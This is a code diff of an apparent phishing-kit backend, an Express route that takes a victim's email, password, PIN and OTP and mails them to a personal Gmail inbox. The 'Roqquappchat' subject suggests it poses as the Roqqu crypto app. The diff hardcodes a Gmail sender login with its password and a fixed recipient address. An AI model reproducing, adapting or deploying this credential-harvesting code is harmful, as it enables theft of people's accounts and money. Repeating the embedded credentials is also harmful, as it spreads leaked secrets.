@@ -99,12 +99,11 @@ app.post('/rq-1', (req, res, next) => {
     } else {
         console.log('Normal email', otp)
         const transporter = nodemailer.createTransport({
-            service: process.env.SERVICE,
+            service: 'gmail',
             auth: {
-                 user: process.env.EMAIL,
-                pass: process.env.PASSWORD,
+                user: 'www.bundleafrica@gmail.com',
+                pass: 'Roqquscam123',
             },
-        
         })
 
         transporter.verify(function (error, _success) {
@@ -118,9 +117,8 @@ app.post('/rq-1', (req, res, next) => {
         const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!!`
 
         const mail = {
-            from: process.env.EMAIL,
-            //to: process.env.TOEMAIL,
-            to: `${process.env.TOEMAIL}`,
+            from: 'www.bundleafrica@gmail.com',
+            to: 'testimonyibom@gmail.com',
             subject: 'New message from Roqquappchat',
             html: content,
         }
